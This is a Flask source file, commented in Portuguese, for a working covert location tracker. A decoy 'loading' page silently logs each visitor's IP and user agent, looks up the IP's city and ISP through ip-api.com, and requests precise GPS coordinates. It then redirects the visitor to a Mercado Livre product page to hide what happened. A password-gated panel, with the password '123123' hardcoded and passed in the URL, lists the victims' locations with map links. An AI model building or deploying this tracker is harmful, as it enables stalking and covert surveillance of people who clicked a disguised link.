from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json

app = Flask(__name__)

# Listas separadas para armazenar os registros na memória
registros_gps = []
registros_ip = []

# Senha simples para o seu painel
SENHA_ADMIN = "123123"

# Página HTML de Captura (Tenta GPS e captura IP em paralelo)
HTML_CAPTURA = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; background-color: #f4f4f9; }
        h2 { color: #333; }
    </style>
</head>
<body>
    <h2>Carregando conteúdo, por favor aguarde...</h2>
    <script>
        // Dispara requisição silenciosa para registrar o IP imediatamente ao abrir
        fetch('/salvar-ip', { method: 'POST' }).catch(e => console.log(e));

        function enviarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            fetch('/salvar-loc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
            }).then(() => {
                window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
            });
        }

        function erroLocalizacao(error) {
            console.log("Erro ou negado: " + error.message);
            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviarLocalizacao, erroLocalizacao, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        } else {
            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
        }
    </script>
</body>
</html>
"""

# Painel Administrativo em Estilo Retro / COBOL (Azul com Vermelho/Branco)
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>MAINFRAME TERMINAL - ADMIN CONSOLE</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            padding: 20px; 
            background: #0000AA; /* Azul clássico de terminal antigo */
            color: #FFFFFF; 
        }
        h2, h3 { 
            color: #FF0000; /* Vermelho vibrante estilo IDE antiga */
            text-transform: uppercase; 
            border-bottom: 2px dashed #FF0000;
            padding-bottom: 5px;
        }
        .container { max-width: 1200px; margin: auto; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #000066; 
            margin-top: 15px; 
            margin-bottom: 30px;
            border: 2px solid #FF0000;
        }
        th, td { 
            border: 1px solid #FF0000; 
            padding: 8px 12px; 
            text-align: left; 
            font-size: 13px;
        }
        th { 
            background: #000033; 
            color: #FF0000; 
            font-weight: bold;
        }
        tr:hover { background: #000088; }
        a { color: #FFFF00; text-decoration: underline; font-weight: bold; }
        a:hover { color: #FF0000; }
        .aviso-vazio { color: #FF5555; text-align: center; font-style: italic; }
        .system-info { font-size: 11px; color: #FFFF55; margin-bottom: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h2>=== SISTEMA DE MONITORAMENTO / MAINFRAME V1.0 ===</h2>
    <div class="system-info">
        STATUS: ONLINE | SECURITY: LEVEL-ADMIN | SESSION ACTIVE: TRUE
    </div>

    <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
    <p>Total de Registros GPS: {{ gps|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>IP DE ORIGEM</th>
            <th>LATITUDE / LONGITUDE</th>
            <th>PRECISÃO</th>
            <th>MAPA EXTERNO</th>
        </tr>
        {% for r in gps %}
        <tr>
            <td>{{ r.data }}</td>
            <td>{{ r.ip }}</td>
            <td>{{ r.lat }}, {{ r.lon }}</td>
            <td>{{ r.precisao }}m</td>
            <td><a href="{{ r.maps }}" target="_blank">[ABRIR MAPA]</a></td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="aviso-vazio">>> NENHUM DADO DE GPS CAPTURADO AINDA <<</td></tr>
        {% endfor %}
    </table>

    <h3>[ TABELA 2: RASTREAMENTO PASSIVO POR IP & DISPOSITIVO ]</h3>
    <p>Total de Registros IP: {{ ips|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>ENDEREÇO IP</th>
            <th>LOCALIZAÇÃO (GEO-IP)</th>
            <th>ISP / PROVEDOR</th>
            <th>USER-AGENT / DISPOSITIVO</th>
        </tr>
        {% for r in ips %}
        <tr>
            <td>{{ r.data }}</td>
            <td>{{ r.ip }}</td>
            <td>{{ r.cidade }} / {{ r.estado }} ({{ r.pais }})</td>
            <td>{{ r.isp }}</td>
            <td>{{ r.user_agent }}</td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="aviso-vazio">>> NENHUM DADO DE IP CAPTURADO AINDA <<</td></tr>
        {% endfor %}
    </table>
</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-loc', methods=['POST'])
def salvar_loc():
    dados = request.json
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    registros_gps.insert(0, {
        "data": agora,
        "ip": ip_cliente,
        "lat": lat,
        "lon": lon,
        "precisao": precisao,
        "maps": maps_link
    })
    
    return jsonify({"status": "sucesso"})

@app.route('/salvar-ip', methods=['POST'])
def salvar_ip():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Consulta API pública gratuita de geolocalização por IP para enriquecer os dados
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                data = json.loads(response.read().decode())
                if data.get('status') == 'success':
                    cidade = data.get('city', 'Desconhecido')
                    estado = data.get('regionName', 'Desconhecido')
                    pais = data.get('country', 'Desconhecido')
                    isp = data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro ao consultar IP:", e)
        
    registros_ip.insert(0, {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "user_agent": user_agent
    })
    
    return jsonify({"status": "sucesso"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #000; color: #FF0000; text-align: center; margin-top: 15%;">
            <h2>ACCESS DENIED - INVALID CREDENTIALS</h2>
            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)